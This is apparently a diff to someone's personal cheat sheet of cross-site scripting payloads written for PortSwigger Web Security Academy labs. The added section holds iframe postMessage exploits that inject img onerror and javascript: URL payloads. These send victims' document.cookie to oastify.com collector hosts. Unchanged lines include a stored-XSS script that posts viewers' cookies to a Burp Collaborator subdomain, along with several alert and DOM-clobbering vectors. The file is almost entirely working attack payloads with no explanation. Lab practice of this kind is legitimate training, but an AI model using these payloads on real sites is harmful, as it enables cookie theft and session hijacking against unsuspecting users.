@@ -10,6 +10,31 @@ javascript:alert(1)
 foo?&apos;-alert(1)-&apos;
 ${alert(1)}
 
+
+
+
+
+
+#Exploit Server:
+
+//1-PostMessages
+<iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload=' this.contentWindow.postMessage("<img src=https://v62ftvfm3278074yfn9mdkh5iwoncd02.oastify.com/?cookie"+document.cookie+" onerror=alert(1); >"+document.cookie,"*") '>
+<iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>","*")'>
+
+//2-PostMessages
+<iframe id="samFrame" img src="https://0a3a000c04aa33b7c1297603007500ac.web-security-academy.net/" width="640" height="640"></iframe>
+
+<script>
+document.getElementById("samFrame").onload = function() {onloadFunct()};
+
+function onloadFunct  () {
+document.getElementById("samFrame").contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:javascript:fetch('https://hzkzogy29vgtb605a6tk0j86xx3orff4.oastify.com/?cookie='+document.cookie)\"}","*");
+}
+
+</script>
+
+
+
 //This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.					
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
@@ -66,3 +91,11 @@ Comment=<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;oner
 Comment=<form id=x tabindex=0 onfocus=print()><input id=attributes>
 <img src=1 oNeRrOr=alert`1`>
 <img src=1 onerror='alert(1)'>
+
+
+
+
+-------------
+
+
+
